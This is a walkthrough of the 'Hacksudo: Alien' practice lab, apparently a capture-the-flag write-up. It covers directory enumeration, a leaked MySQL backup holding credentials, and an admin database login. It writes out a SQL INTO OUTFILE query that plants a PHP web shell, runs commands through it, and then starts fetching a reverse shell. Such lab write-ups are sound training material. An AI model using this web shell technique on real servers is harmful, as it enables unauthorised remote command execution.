# Hacksudo: Alien

As always, starting the lab with a **netdiscover** command to identify the IP associated with the target machine. Once I've found it, I will run a nmap scan to see what ports are currently open.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/7a478dc5-d47c-4121-abe7-e11194c41e3e" />

I can then open Firefox to see what the web app looks like before inspecting and snooping around the app.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/d590db39-e2bd-4bd6-ab7c-2f59ba37fd27" />

Nothing stood out like crazy so I ran a gobuster command to see if there were any hidden directories that were exposed to the public. After running **gobuster dir -u http://192.168.19.146 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip~**, I found two directories. One called /images and one called /backup.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/203ee689-0529-47f4-90f1-cbd8273b3df4" />

When appending /backup to the hostname in Firefox, a file appears that looks like it has to do with the target machine's DB. I download the file and run **cat mysql.bak** to read it.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/d51478b3-91ff-4be5-a2b1-bcbd98fcd359" />

Pretty quickly I now have DB credentials. Username is **vishal** and password is **hacksudo**. I'm sure this will be of use later but for now, I will run another gobuster command but for port 9000 since it is running.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/d65b3be9-c6ec-48ad-83c6-9612d022fa82" />

I dug around and got to the /templates directory on Firefox. There were a bunch of different directories but I selected the parent directory which took me to a PHP admin login page.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/5dc473a9-b036-4996-9949-51b835651400" />

I then used the credentials I found earlier from the mysql.bak file which did allow me to login to vishal's account as an admin.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/b46d71b2-ed60-4f0d-8c14-f5f6b26e264c" />

Now that I have access to this app that handles the administration of MySQL over the web, I kind of just explored what was available to see what I could do next. I did some research and found that through an admin account, a php reverse shell can be done. What I did first was execute malicious code as a SQL query which will created a command shell vulnerability inside the web server. It also puts a minimalist command prompt into a file called cmd.php in the /var/www/html/ directory.

I executed this query: **SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/cmd.php'** which then returned nothing as expected. From here, I went back to the host on port 80 and appended **/cmd.php?cmd=pwd** to the URL which returned this:

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/f675bbdf-ec15-4448-a06b-28879f7dd023" />

This tells me that I created a successfull command shell vulnerability. The reverse shell that I used was from pentestmonkey. I went to their github repo and ran **wget** to download the raw php file.

